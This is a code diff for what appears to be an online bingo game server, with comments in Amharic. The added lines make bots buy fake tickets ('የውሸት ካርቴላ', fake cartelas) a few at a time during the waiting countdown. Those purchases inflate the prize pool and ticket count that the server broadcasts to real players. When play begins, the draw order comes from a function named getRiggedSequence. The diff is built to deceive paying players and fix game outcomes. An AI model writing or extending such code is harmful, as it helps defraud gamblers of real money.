@@ -1376,6 +1376,61 @@ setInterval(() => {
         return; 
     }
     
+    if (gameState === "WAITING") {
+        gameClock--;
+        
+        // 🔥 የውሸት ካርቴላ Smoothly የመግዛት ሎጂክ (ከTimer ጋር አብሮ)
+        let targetBotAmount = GLOBAL_SETTINGS.botBoostAmount || 0;
+        let diff = targetBotAmount - botInjectedAmount;
+
+        if (diff > 0 && gameClock > 0) {
+            let ticketPrice = GLOBAL_SETTINGS.ticketPrice || 10;
+            let maxTixLeft = Math.floor(diff / ticketPrice);
+            
+            if (maxTixLeft > 0) {
+                // ቀስ እያለ እንዲገዛ የቀረውን ካርቴላ በቀረው ሰከንድ ማካፈል
+                let buyNow = Math.ceil(maxTixLeft / gameClock);
+                if (buyNow > maxTixLeft) buyNow = maxTixLeft;
+                
+                let cost = buyNow * ticketPrice;
+                botInjectedAmount += cost;
+                totalCollectedMoney += cost;
+                let addedPrize = cost * ((100 - (GLOBAL_SETTINGS.adminProfitPercent || 15)) / 100);
+                totalPrizePool += addedPrize;
+                totalTickets += buyNow;
+
+                for(let i=0; i<buyNow; i++) {
+                    let fakeId = getUnusedFakeTicketId();
+                    globalTakenTickets.push(fakeId);
+                    // የውሸት ካርቴላው አካላዊ ግሪድ አለው (ቁጥር እንዲጠራለት)
+                    fakeTicketsStore.push({ id: fakeId, grid: generateFakeGrid() });
+                }
+                io.emit('update_taken_tickets', globalTakenTickets);
+            }
+        }
+
+        io.emit('game_status', { 
+            state: gameState, timer: gameClock, totalPrizePool, jackpotBoost: GLOBAL_SETTINGS.jackpotBoostAmount || 0, 
+            totalTickets, ticketPrice: GLOBAL_SETTINGS.ticketPrice, calledNumbers, playersCount: Object.keys(activePlayers).length, gameId, 
+            maxTickets: GLOBAL_SETTINGS.maxTicketsPerUser, depBannerTextAm: GLOBAL_SETTINGS.depBannerTextAm, depBannerTextEn: GLOBAL_SETTINGS.depBannerTextEn, witBannerTextAm: GLOBAL_SETTINGS.witBannerTextAm, witBannerTextEn: GLOBAL_SETTINGS.witBannerTextEn, minWithdrawLimit: GLOBAL_SETTINGS.minWithdrawLimit 
+        });
+        
+        if (gameClock <= 0) { 
+            if(Object.keys(activePlayers).length > 1) { 
+                gameState = "PLAYING"; gameClock = 3; 
+                currentDrawSequence = getRiggedSequence(); 
+                midGameChosenRigged = null;
+                targetWinTurn = 0; 
+                
+                io.emit('game_status', { 
+                    state: gameState, timer: gameClock, totalPrizePool, jackpotBoost: GLOBAL_SETTINGS.jackpotBoostAmount || 0, 
+                    totalTickets, ticketPrice: GLOBAL_SETTINGS.ticketPrice, calledNumbers, playersCount: Object.keys(activePlayers).length, gameId, 
+                    maxTickets: GLOBAL_SETTINGS.maxTicketsPerUser, depBannerTextAm: GLOBAL_SETTINGS.depBannerTextAm, depBannerTextEn: GLOBAL_SETTINGS.depBannerTextEn, witBannerTextAm: GLOBAL_SETTINGS.witBannerTextAm, witBannerTextEn: GLOBAL_SETTINGS.witBannerTextEn, minWithdrawLimit: GLOBAL_SETTINGS.minWithdrawLimit 
+                });
+            } else { 
+                gameClock = GLOBAL_SETTINGS.gameTimer; 
+            }
+        }
     } else if (gameState === "PLAYING") {
         gameClock--;
         if (gameClock <= 0) {
